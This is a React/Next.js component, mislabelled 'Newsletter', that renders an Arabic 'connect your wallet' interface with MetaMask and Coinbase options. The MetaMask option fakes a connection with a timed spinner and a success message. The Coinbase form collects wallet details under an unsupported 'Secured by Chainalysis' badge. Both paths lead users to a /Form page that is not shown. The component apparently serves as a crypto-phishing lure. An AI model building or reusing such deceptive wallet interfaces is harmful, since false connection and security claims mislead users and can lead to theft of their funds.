"use client";

import Image from "next/image";
import Link from "next/link";
import { Dialog, Transition } from "@headlessui/react";
import { Fragment, useState } from "react";
import { useRouter } from "next/navigation";

const Newsletter = () => {
  const [isOpen, setIsOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false); // Loading state for Meta Mask
  const [infoDisplayed, setInfoDisplayed] = useState(false); // Info state for Meta Mask
  const [isFormOpen, setIsFormOpen] = useState(false); // Form popup state for Coinbase
  const [formData, setFormData] = useState({ wallet: "", address: "" });
  const router = useRouter();

  const closeModal = () => {
    setIsOpen(false);
    setIsLoading(false);
    setInfoDisplayed(false);
  };

  const openModal = () => {
    setIsOpen(true);
    setIsLoading(false);
    setInfoDisplayed(false);
  };

  const handleLinkClick = () => {
    setIsLoading(true); // Start the loading sequence
    setInfoDisplayed(false);

    // Simulate loading process
    setTimeout(() => {
      setIsLoading(false); // Stop the loading spinner
      setInfoDisplayed(true); // Display additional information
    }, 6000); // Adjust the delay as needed
  };

  const openFormPopup = () => {
    setIsFormOpen(true); // Open the form popup
  };

  const closeFormPopup = () => {
    setIsFormOpen(false); // Close the form popup
  };

  const handleFormChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleFormSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsFormOpen(false); // Close the form popup
    router.push("/Info"); // Redirect to another page
  };

  return (
    <div className="relative z-3">
      <div className="mx-auto max-w-2xl lg:max-w-7xl bg-blue-500 rounded-3xl">
        <div className="grid grid-cols-1 gap-y-10 gap-x-6 lg:grid-cols-2 xl:gap-x-8">
          {/* COLUMN-1 */}
          <div>
            <div className="float-left p-20 relative">
              <p className="text-4xl md:text-2xl font-semibold mb-3 text-white">
              توازن
              </p>
              <h3 className="text-4xl md:text-5xl font-semibold mb-3 text-white flex items-center">
                <img
                  src="./assets/logo/usdc.png"
                  alt=""
                  className="w-8 h-8 mr-2"
                />
                0.0000
              </h3>
              <p className="text-4xl md:text-2xl font-semibold mb-3 text-white">
                $0.00
              </p>
            </div>
          </div>

          {/* COLUMN-2 */}
          <div className="p-10 flex flex-col justify-center items-start">
            <h3 className="text-3xl md:text-5xl font-semibold mb-4 text-white">
              قم بتوصيل محفظتك
            </h3>
            <div className="flex items-center">
              <button
                className="text-blue text-lg font-medium py-4 px-10 transition duration-150 ease-in-out leafbutton bg-lightblue hover:text-white hover:bg-blue"
                onClick={openModal}
              >
               ربط المحفظة
              </button>
            </div>

            {/* Main Modal */}
            <Transition appear show={isOpen} as={Fragment}>
              <Dialog as="div" className="relative z-10" onClose={closeModal}>
                <Transition.Child
                  as={Fragment}
                  enter="ease-out duration-300"
                  enterFrom="opacity-0"
                  enterTo="opacity-100"
                  leave="ease-in duration-200"
                  leaveFrom="opacity-100"
                  leaveTo="opacity-0"
                >
                  <div className="fixed inset-0 bg-black bg-opacity-25" />
                </Transition.Child>

                <div className="fixed inset-0 overflow-y-auto">
                  <div className="flex min-h-full items-center justify-center p-4 text-center">
                    <Transition.Child
                      as={Fragment}
                      enter="ease-out duration-300"
                      enterFrom="opacity-0 scale-95"
                      enterTo="opacity-100 scale-100"
                      leave="ease-in duration-200"
                      leaveFrom="opacity-100 scale-100"
                      leaveTo="opacity-0 scale-95"
                    >
                      <Dialog.Panel className="w-full max-w-md transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all">
                        <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
                          <div className="w-full max-w-md space-y-8">
                            <div>
                              <img
                                className="mx-auto h-12 w-auto"
                                src="/assets/logo/logo.png"
                                alt="Your Company"
                              />
                              <h2 className="mt-6 text-center text-3xl font-bold tracking-tight text-gray-900">
                              قم بتوصيل محفظتك
                              </h2>
                              <p className="mb-4 text-center">
                              ابدأ باستخدام تطبيق أمل
                              </p>
                            </div>
                            {/* Meta Mask Option */}
                            <div
                              onClick={handleLinkClick}
                              className="cursor-pointer mb-2 flex items-center border border-gray-300 rounded-lg p-4 bg-white max-w-sm shadow-md hover:bg-gray-100 transition"
                            >
                              <div className="flex-shrink-0">
                                <img
                                  src="./assets/logo/wallet.png"
                                  alt=""
                                  className="w-10 h-10"
                                />
                              </div>
                              <div className="ml-4">
                                <h3 className="text-lg font-semibold text-gray-800">
                                  Meta Mask, Trust Wallet....
                                </h3>
                                <p className="text-sm text-gray-600">
                                ومحفظة المتصفح الأخرى
                                </p>
                              </div>
                            </div>

                            {/* Coinbase Option */}
                            <div
                              onClick={openFormPopup} // Trigger the form popup
                              className="cursor-pointer mb-2 flex items-center border border-gray-300 rounded-lg p-4 bg-white max-w-sm shadow-md hover:bg-gray-100 transition"
                            >
                              <div className="flex-shrink-0">
                                <img
                                  src="./assets/logo/wallet.png"
                                  alt=""
                                  className="w-10 h-10"
                                />
                              </div>
                              <div className="ml-4">
                                <h3 className="text-lg font-semibold text-gray-800">
                                  Coinbase, Binance...
                                </h3>
                                <p className="text-sm text-gray-600">
                                ومحفظة أخرى على شبكة الإنترنت
                                </p>
                              </div>
                            </div>

                            {/* Loading Spinner and Info for Meta Mask */}
                            {isLoading && (
                              <div className="flex justify-center items-center mt-4">
                                <svg
                                  className="animate-spin h-6 w-6 text-blue-500"
                                  xmlns="http://www.w3.org/2000/svg"
                                  fill="none"
                                  viewBox="0 0 24 24"
                                >
                                  <circle
                                    className="opacity-25"
                                    cx="12"
                                    cy="12"
                                    r="10"
                                    stroke="currentColor"
                                    strokeWidth="4"
                                  ></circle>
                                  <path
                                    className="opacity-75"
                                    fill="currentColor"
                                    d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                                  ></path>
                                </svg>
                                <p className="ml-2 text-blue-500">Loading...</p>
                              </div>
                            )}
                            {infoDisplayed && (
                              <div className="text-center mt-4">
                                <p className="text-green-500 font-semibold">
                                معالجة اتصال المحفظة!
                                </p>
                                <p className="text-gray-700">
                                أنت الآن جاهز لبدء استخدام التطبيق.
                                </p>
                                <div className="mt-4 flex justify-end">
                                  <Link href="/Form">
                                    <button
                                      type="button"
                                      className="text-blue-500 inline-flex justify-center rounded-md border border-transparent bg-blue-100 px-4 py-2 text-sm font-medium text-blue-900"
                                    >
                                      الاستمرار في التطبيق
                                    </button>
                                  </Link>
                                </div>
                              </div>
                            )}
                          </div>
                        </div>
                      </Dialog.Panel>
                    </Transition.Child>
                  </div>
                </div>
              </Dialog>
            </Transition>

            {/* Form Popup for Coinbase */}
            <Transition appear show={isFormOpen} as={Fragment}>
              <Dialog as="div" className="relative z-20" onClose={closeFormPopup}>
                <Transition.Child
                  as={Fragment}
                  enter="ease-out duration-300"
                  enterFrom="opacity-0"
                  enterTo="opacity-100"
                  leave="ease-in duration-200"
                  leaveFrom="opacity-100"
                  leaveTo="opacity-0"
                >
                  <div className="fixed inset-0 bg-black bg-opacity-50" />
                </Transition.Child>

                <div className="fixed inset-0 overflow-y-auto">
                  <div className="flex items-center justify-center min-h-full p-4">
                    <Dialog.Panel className="w-full max-w-md bg-white rounded-lg shadow-lg p-6">
                      <h3 className="text-xl font-semibold text-gray-800 mb-4">
                      
                      نموذج المحفظة
                      </h3>
                      <form onSubmit={handleFormSubmit}>
                        <div className="mb-4">
                          <label
                            htmlFor="wallet"
                            className="block text-sm font-medium text-gray-700"
                          >
                          اسم المحفظة
                          </label>
                          <input
                            type="text"
                            id="wallet"
                            name="wallet"
                            value={formData.wallet}
                            onChange={handleFormChange}
                            required
                            className="block w-full p-2 border rounded-lg shadow-sm"
                            placeholder="أدخل اسم محفظتك"
                          />
                        </div>
                        <div className="mb-4">
                          <label
                            htmlFor="text"
                            className="block text-sm font-medium text-gray-700"
                          >
                           عنوان المحفظة
                          </label>
                          <input
                            type="text"
                            id="address"
                            name="address"
                            value={formData.address}
                            onChange={handleFormChange}
                            required
                            className="block w-full p-2 border rounded-lg shadow-sm"
                            placeholder="أدخل عنوان محفظتك"
                          />
                        </div>
                        <label className="text-sm font-medium text-gray-900 dark:text-gray-300">
                          <span className="text-red-500 dark:text-red-500"style={{ color: "red" }}>*</span>{" "}
                          Secured by{" "}
                          <a
                              href="https://www.chainalysis.com/"
                              target="_blank"
                              rel="noopener noreferrer"
                              className="text-blue-600 hover:underline dark:text-blue-500" style={{ color: "blue" }}
                          >
                              Chainalysis
                          </a>
                      </label>
                        <div className="flex justify-end space-x-4">
                          <button
                            type="button"
                            onClick={closeFormPopup}
                            className="px-4 py-2 bg-gray-300 rounded-lg hover:bg-gray-400"
                          >
                            يلغي
                          </button>
                          <Link href="/Form">
                            <button
                              type="submit"
                              className="px-4 py-2 bg-blue-600 text-black rounded-lg hover:bg-blue-700"
                            >
                              يُقدِّم
                            </button>
                          </Link>
                          {isLoading && (
                              <div className="flex justify-center items-center mt-4">
                                <svg
                                  className="animate-spin h-6 w-6 text-blue-500"
                                  xmlns="http://www.w3.org/2000/svg"
                                  fill="none"
                                  viewBox="0 0 24 24"
                                >
                                  <circle
                                    className="opacity-25"
                                    cx="12"
                                    cy="12"
                                    r="10"
                                    stroke="currentColor"
                                    strokeWidth="4"
                                  ></circle>
                                  <path
                                    className="opacity-75"
                                    fill="currentColor"
                                    d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                                  ></path>
                                </svg>
                                <p className="ml-2 text-blue-500">Loading...</p>
                              </div>
                            )}
                        </div>
                      </form>
                    </Dialog.Panel>
                  </div>
                </div>
              </Dialog>
            </Transition>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Newsletter;
